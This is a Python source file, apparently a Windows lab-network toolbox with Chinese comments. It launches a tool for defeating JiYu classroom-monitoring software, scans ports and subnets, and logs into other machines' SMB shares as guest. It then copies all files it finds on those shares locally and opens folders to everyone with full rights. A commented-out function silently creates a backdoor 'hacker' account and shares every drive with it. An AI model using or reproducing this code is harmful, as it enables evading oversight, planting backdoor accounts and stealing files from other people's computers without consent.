import shutil, datetime, time, ipaddress, threading, socket
from scapy.all import *
from smbprotocol.connection import Connection
from smbprotocol.session import Session
from smbprotocol.tree import TreeConnect
from smbprotocol.open import Open
from tqdm import tqdm
import webbrowser
import platform, psutil, subprocess, ldap3

from all import *
from exe import jiyu, filess, page, zajiaofuzhu


# def ma_1():
#     hostname = socket.gethostname()  # 获取本机所有IP地址
#     ip_addresses = socket.gethostbyname_ex(hostname)[2]
#     ip_list = []
#     for ip in ip_addresses:  # 打印所有IP地址
#         ip_list.append(ip)
#     if len(ip_list) == 1 and ip_list[0].startswith("10.30"):
#         subprocess.run("net user hacker QWERasdf1234 /add", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
#         for letter in string.ascii_uppercase:
#             command = f'net share {letter}={letter}:\\ /grant:hacker,full'
#             subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def exe_2(choice):
    if choice == "1":
        clear_console()
        # 尝试复制到 C 盘根目录
        try:
            try:
                print(rgb_len("red", "正在尝试创建到C盘根目录下>>>"), end="")
                jiyu.run_exe("C:/JiYuTrainer.exe")
                # 运行临时文件
                subprocess.run(['C:/JiYuTrainer.exe'])
            except (PermissionError, FileNotFoundError):
                # 如果复制到 C 盘根目录失败，尝试复制到 D 盘根目录
                print(rgb_len("red", "失败"))
                print(rgb_len("red", "正在尝试创建到D盘根目录下>>>"), end="")
                try:
                    print()
                    jiyu.run_exe("D:/JiYuTrainer.exe")
                    # 运行临时文件
                    subprocess.run(['D:/JiYuTrainer.exe'])
                except (PermissionError, FileNotFoundError):
                    print(rgb_len("red", "失败"))
                    for i in range(3):
                        print(rgb_len("red", "我们没有任何权限！！！尝试以管理员身份运行！！！"))
        except:
            print(rgb_len("red", "创建完成但是打开时发生错误！！！"))
    elif choice == "2":
        clear_console()
        print(rgb_len("red", "Ctrl + Alt + F: 紧急全屏快捷键"))
        print(rgb_len("red", "Ctrl + Alt + D: 快速显示/隐藏窗口快捷键"))
    elif choice == "3":
        clear_console()
        # 尝试复制到 C 盘根目录
        try:
            print(rgb_len("red", "正在尝试创建到C盘根目录下>>>"), end="")
            jiyu.tk_jy("C:/TK.bat")
            # 运行临时文件
            subprocess.run(['C:/TK.bat'])
        except (PermissionError, FileNotFoundError):
            # 如果复制到 C 盘根目录失败，尝试复制到 D 盘根目录
            print(rgb_len("red", "失败"))
            print(rgb_len("red", "正在尝试创建到D盘根目录下>>>"), end="")
            try:
                print()
                jiyu.tk_jy("D:/TK.bat")
                # 运行临时文件
                subprocess.run(['D:/TK.bat'])
            except (PermissionError, FileNotFoundError):
                print(rgb(255, 0, 0, "失败"))
                for i in range(3):
                    print(rgb_len("red", "我们没有任何权限！！！尝试以管理员身份运行！！！"))
    else:
        clear_console()
        print(rgb_len("red", "请输入正确的选项！"))

def exe_3(choice):
    if choice == "1":
        def scan(ip, port):# 定义扫描函数
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            if result == 0:
                print(rgb_len("red", f"端口{port}开放在{ip}上"))
            sock.close()
        def thread_scan(ip, ports):# 多线程扫描函数
            threads = []
            for port in ports:
                t = threading.Thread(target=scan, args=(ip, port))
                threads.append(t)
                t.start()

            for t in threads:
                t.join()
        try:# 获取用户输入
            print(rgb_len("yellow", "退出这个功能只需要不写入数据即可"))
            ip_address = input(rgb_len("red", "请输入要扫描的IP地址："))
            ports_list = input(rgb_len("red",  "1.扫描所有端口（很慢）\n2.扫描常用端口（较快）\n3.扫描指定端口（多个之间使用;分割）\n请选择："))
            clear_console()
            if ports_list == "1":
                ports = range(0, 65535 + 1)
                thread_scan(ip_address, ports)
            elif ports_list == "2":
                ports = [20, 21, 22, 23, 25, 53, 67, 68, 80, 110, 143, 443, 445, 3389, 8000, 8080]
                thread_scan(ip_address, ports)
            elif ports_list == "3":
                ports = input(rgb_len("red", "请输入要扫描的端口：")).split(";")
                ports = [int(port) for port in ports]
                print(ports)
                thread_scan(ip_address, ports)
        except Exception as e:
            clear_console()
            print(rgb_len("red", "出现错误或者人为希望退出这个程序"))
    elif choice == "2":
        clear_console()
        print(rgb_len("red", filess.get_port_info()))
    elif choice == "3":
        clear_console()
        def ping(ip):# 定义扫描函数
            result = subprocess.run(['ping', '-n', '1', '-w', '1000', str(ip)], capture_output=True, text=True)
            if "TTL=" in result.stdout:
                print(rgb_len("red", f"{ip} 存活"))
        def thread_scan(network):# 多线程扫描函数
            threads = []
            for ip in network:
                t = threading.Thread(target=ping, args=(ip,))
                threads.append(t)
                t.start()
            for t in threads:
                t.join()
        try:# 获取用户输入
            network_input = input(rgb_len("red", "请输入要扫描的网段（例如：192.168.1.0/24）："))
            clear_console()
            network = ipaddress.ip_network(network_input, strict=False)
            thread_scan(network)
        except Exception as e:
            print(rgb_len("red", f"出现错误！！！请确认是否有写错！！！"))
    else:
        clear_console()
        print(rgb_len("red","请输入正确的选项！"))

def exe_4(choice):
    if choice == "1":
        clear_console()
        def scan_shared_folders(ip, write_to_file):  # 定义扫描函数，增加write_to_file参数
            try:
                connection = Connection(uuid.uuid4(), str(ip))
                connection.connect()
                session = Session(connection, "guest", "")
                session.connect()
                print(rgb_len("red", f"{ip} 开启了共享文件夹"))
                if write_to_file:
                    with open("D:/output.txt", "a") as file:  # 将输出写入到D盘根目录下的文件中
                        file.write(f"{ip}\n")
            except Exception as e:
                pass
        def thread_scan(network, write_to_file):  # 多线程扫描函数，增加write_to_file参数
            threads = []
            for ip in network:
                t = threading.Thread(target=scan_shared_folders, args=(ip, write_to_file))
                threads.append(t)
                t.start()
            for t in threads:
                t.join()
        try:  # 获取用户输入
            write_to_file_input = input(rgb_len("red", "是否将输出写入到D盘根目录下，如果之前输出将会覆盖(确定输入y，不需要不用输入)>>>"))
            write_to_file = write_to_file_input.lower() == 'y'
            if write_to_file:  # 如果用户选择写入文件，则清空文件
                with open("D:/output.txt", "w") as file:
                    file.write("")
            network_input = input(rgb_len("red", "请输入要扫描的网段（例如：192.168.1.0/24）："))
            clear_console()
            network = ipaddress.ip_network(network_input, strict=False)
            thread_scan(network, write_to_file)
        except Exception as e:
            print(rgb_len("red", "扫描出错！！！"))
    elif choice == "2":
        clear_console()
        try:# 读取output.txt中的IP地址
            with open('D:/output.txt', 'r') as file:
                ip_addresses = file.read().splitlines()
        except:
            print(rgb_len("red", "没有找到output.txt文件，请先执行4选项，或者查看是否有权限访问文件"))
        shared_folder_path = 'D:/共享文件夹'# 创建共享文件夹
        os.makedirs(shared_folder_path, exist_ok=True)
        for ip in ip_addresses:# 遍历IP地址并列出共享文件夹
            try:
                result = subprocess.run(['net', 'view', f'\\\\{ip}'], capture_output=True, text=True)# 使用net view命令列出共享文件夹
                if result.returncode == 0:
                    shared_folders = []
                    lines = result.stdout.splitlines()
                    for line in lines:
                        if line and not line.startswith('共享名') and not line.startswith(
                                '命令成功完成') and not line.startswith('在') and not line.startswith('---'):
                            parts = line.split()
                            if parts:
                                shared_folders.append(parts[0])
                    for folder in shared_folders:
                        source_folder = f'\\\\{ip}\\{folder}'
                        destination_folder = os.path.join(shared_folder_path, ip, folder)
                        os.makedirs(destination_folder, exist_ok=True)
                        try:
                            total_files = sum([len(files) for r, d, files in os.walk(source_folder)])# 获取要复制的文件总数
                            with tqdm(total=total_files, desc=f"正在复制 {source_folder}") as pbar:# 显示复制进度条
                                for root, dirs, files in os.walk(source_folder):
                                    for file in files:
                                        src_file = os.path.join(root, file)
                                        dst_file = os.path.join(destination_folder,os.path.relpath(src_file, source_folder))
                                        os.makedirs(os.path.dirname(dst_file), exist_ok=True)
                                        shutil.copy2(src_file, dst_file)
                                        pbar.update(1)
                                        pbar.refresh()  # 刷新进度条
                            print(rgb_len("green", f"已复制 {source_folder} 到 {destination_folder}"))
                        except Exception as e:
                            print(rgb_len("red", f"复制 {source_folder} 时出错: {e}"))
                else:
                    print(rgb_len("yellow", f"无法访问 {ip} 的共享文件夹"))
            except Exception as e:
                print(rgb_len("red", f"处理 {ip} 时出错: {e}"))
    elif choice == "3":
        clear_console()
        def list_shared_folders():
            # 获取所有共享文件夹的列表
            shared_folders = os.popen('net share').read().splitlines()

            # 打印共享文件夹列表
            for line in shared_folders:
                if line and not line.startswith('Share name') and not line.startswith('---'):
                    print(rgb_len("red", line))

        # 执行函数打印所有共享文件夹
        list_shared_folders()
    elif choice == "4":
        clear_console()
        a = input(rgb_len("red","注意！！！该操作将会删除所有共享文件夹信息！！！确认输入y>>>"))
        def close_all_shared_folders():
            # 获取所有共享文件夹的列表
            shared_folders = os.popen('net share').read().splitlines()
            shared_paths = []
            # 遍历列表并关闭每个共享文件夹
            for line in shared_folders:
                if line and not line.startswith('Share name') and not line.startswith('---'):
                    share_name = line.split()[0]
                    share_path = line.split()[-1]
                    shared_paths.append(share_path)
                    not_kill = ["C$", "D$", "IPC$", "ADMIN$"]
                    if share_name not in not_kill:
                        try:
                            subprocess.run(f'net share {share_name} /delete', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
                            print(rgb_len("green", f'成功关闭共享文件夹 {share_name}'))
                        except subprocess.CalledProcessError:
                            print(rgb_len("red", f'关闭共享文件夹 {share_name} 失败'))
                    else:
                        print(rgb_len("yellow", f"排除共享文件夹 {share_name}"))
        try:
            if a == "y":
                close_all_shared_folders()
        except:
            for _ in range(3):
                print(rgb_len("red","出现错误，请检查是否有权限执行！！！"))
    elif choice == "5":
        clear_console()
        def write_shared_folders_to_file():
            # 获取所有共享文件夹的列表
            shared_folders = os.popen('net share').read().splitlines()
            shared_paths = []
            # 遍历列表并获取每个共享文件夹的目录
            for line in shared_folders:
                if line and not line.startswith('Share name') and not line.startswith('---'):
                    parts = line.split()
                    if len(parts) > 1:
                        not_use = ["共享名", "C$", "D$", "IPC$", "ADMIN$"]
                        for num in range(len(parts)):
                            if parts[num] in not_use:
                                print(rgb_len("red",f"排除共享信息 {parts}"))
                                break
                        else:
                            share_path = parts[-1]
                            print(rgb_len("green", f"记录的共享信息 {share_path}"))
                            shared_paths.append(share_path)
            # 将所有共享目录位置写入D盘下的share.txt，并指定编码为utf-8
            with open('D:/share.txt', 'w', encoding='utf-8') as f:
                for path in shared_paths:
                    f.write(path + '\n')

        write_shared_folders_to_file()
    elif choice == "6":
        clear_console()
        # 定义share.txt文件的路径
        file_path = 'D:\\share.txt'
        # 开启共享文件夹的函数
        def enable_sharing(folder_path):
            # 开启共享的命令
            command = f'net share \"{os.path.basename(folder_path)}\"=\"{folder_path}\" /grant:everyone,FULL'
            result = subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if result.returncode == 0:
                print(rgb_len("green", f'共享已开启: {folder_path}'))
            else:
                print(rgb_len("red", f'开启共享失败: {folder_path} ，请检查是否有权限'))
        # 读取share.txt文件的内容，使用utf-8编码
        with open(file_path, 'r', encoding='utf-8') as file:
            lines = file.readlines()
        # 为文件中列出的每个文件夹开启共享
        for line in lines:
            folder_path = line.strip()
            if os.path.exists(folder_path):
                enable_sharing(folder_path)
            else:
                print(rgb_len("yellow", f'文件夹不存在: {folder_path}'))
    else:
        clear_console()
        print(rgb_len("red","请输入正确的选项！"))

def exe_5(choice):
    if choice == "1":
        clear_console()
        def get_device_specs():
            specs = {
                "设备名称": platform.node(),
                "处理器": platform.processor(),
                "机带 RAM": f"{psutil.virtual_memory().total / (1024 ** 3):.1f} GB ({psutil.virtual_memory().available / (1024 ** 3):.1f} GB 可用)",
                "设备 ID": str(uuid.UUID(int=uuid.getnode())),
                "系统类型": f"{platform.architecture()[0]} 位操作系统, 基于 {platform.machine()} 的处理器"
            }
            return specs
        device_specs = get_device_specs()
        for key, value in device_specs.items():
                print(rgb_len("red",f"{key:<10}{value:<10}"))
    elif choice == "2":
        clear_console()
        def get_windows_specs():
            try:
                # 获取Windows版本信息
                version = subprocess.run(['powershell', '-Command', '(Get-WmiObject -Class Win32_OperatingSystem).Caption'],capture_output=True, text=True).stdout.strip()
                version_number = subprocess.run(['powershell', '-Command', '(Get-WmiObject -Class Win32_OperatingSystem).Version'],capture_output=True, text=True).stdout.strip()
                install_date = subprocess.run(['powershell', '-Command', '(Get-WmiObject -Class Win32_OperatingSystem).InstallDate'],capture_output=True, text=True).stdout.strip()
                os_build = subprocess.run(['powershell', '-Command', '(Get-WmiObject -Class Win32_OperatingSystem).BuildNumber'],capture_output=True, text=True).stdout.strip()
                serial_number = subprocess.run(['powershell', '-Command', '(Get-WmiObject -Class Win32_BIOS).SerialNumber'], capture_output=True,text=True).stdout.strip()
                # 格式化安装日期
                install_date_formatted = f"{install_date[:4]}/{install_date[4:6]}/{install_date[6:8]}"
            except Exception as e:
                return f"Error retrieving Windows specs: {e}"
            specs = {
                "版本": version,
                "版本号": version_number,
                "安装日期": install_date_formatted,
                "操作系统版本": os_build,
                "序列号": serial_number,
            }
            return specs
        windows_specs = get_windows_specs()
        if isinstance(windows_specs, dict):
            for key, value in windows_specs.items():
                print(rgb_len("red",f"{key:<10}{value:<10}"))
        else:
            print(rgb_len("red",windows_specs))
    elif choice == "3":
        clear_console()
        def get_device_manager_devices():
            try:
                # 使用powershell命令获取设备管理器中的所有设备
                result = subprocess.run(['powershell', '-Command', 'Get-PnpDevice | Select-Object -Property Class, FriendlyName'], capture_output=True, text=True)
                devices = result.stdout.strip().split('\n')
            except Exception as e:
                devices = [f"Error retrieving devices: {e}"]
            return devices

        def group_devices_by_class(devices):
            device_dict = {}
            for device in devices[2:]:  # 跳过标题行
                if device.strip():
                    parts = device.split(None, 1)
                    if len(parts) == 2:
                        device_class, friendly_name = parts
                        if device_class not in device_dict:
                            device_dict[device_class] = []
                        device_dict[device_class].append(friendly_name)
            return device_dict

        devices = get_device_manager_devices()
        grouped_devices = group_devices_by_class(devices)

        for device_class, friendly_names in grouped_devices.items():
            print(rgb_len("red",f"{device_class}:"))
            for name in friendly_names:
                print(rgb_len("yellow",f"  - {name}"))
            print()
    else:
        clear_console()
        print(rgb_len("red","请输入正确的选项！"))
